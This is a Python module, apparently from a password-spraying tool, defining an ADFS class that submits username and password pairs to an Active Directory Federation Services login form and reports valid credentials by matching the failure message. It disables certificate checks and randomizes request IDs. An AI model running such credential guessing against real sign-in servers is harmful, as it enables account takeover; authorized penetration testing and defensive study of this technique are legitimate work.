from re import search
import requests
import warnings
from urllib.parse import unquote,parse_qs,urlparse
from uuid import uuid4
warnings.filterwarnings('ignore')

class ADFS():

    def __init__(self,url,randomize_uuid=True,update_username=True,
            headers={},proxies={},verify_ssl=False,timeout=5):
        '''
        - url - Should contain the full url, including query string, that will be
        sent to the server during authentication. I generally use the one generated
        by Microsoft after being redirected to a federated ADFS server.
        - randomize_uuid - Randomizes the UUID value in the query string if observed.
        - update_username - updates the username in the query string if observed
        '''
        # Unquote the URL to avoid double-quoting the query string
        self.url = unquote(url)
        self.headers = headers
        self.proxies = proxies
        self.verify_ssl = verify_ssl
        self.timeout = timeout
        self.randomize_uuid = randomize_uuid # query parameter
        self.update_username = update_username # query parameter value

    def __call__(self,username,password):

        # post data
        data = {
            'UserName':username,
            'Password':password,
            'AuthMethod':'FormsAuthentication',
        }

        url = urlparse(self.url)
        query = parse_qs(url.query)

        if self.update_username: query['username']=username
        if self.randomize_uuid: query['client-request-id']=uuid4()

        # Flatten the query dictionary
        for key in query.keys():
            if query[key].__class__ == list:
                if query[key].__len__() > 0:
                    query[key]=query[key][0]
                else:
                    query[key]=''

        try:
        
            # make the request
            resp = requests.post(
                url.scheme+"://"+url.netloc+url.path,
                params=query,
                data=data,
                headers=self.headers,
                verify=self.verify_ssl,
                allow_redirects=False,
                proxies=self.proxies,
                timeout=self.timeout
            )
        
        # handle timeout exception (dragons be here tbh)
        except requests.exceptions.Timeout as e:
    
            return [0,username,password]
    
        # verify credentials and return outcome
        if not resp.text or (resp.text and search(r'Incorrect user ID or password',resp.text)):
            return [0, username, password]
        else:
            return [1, username, password]
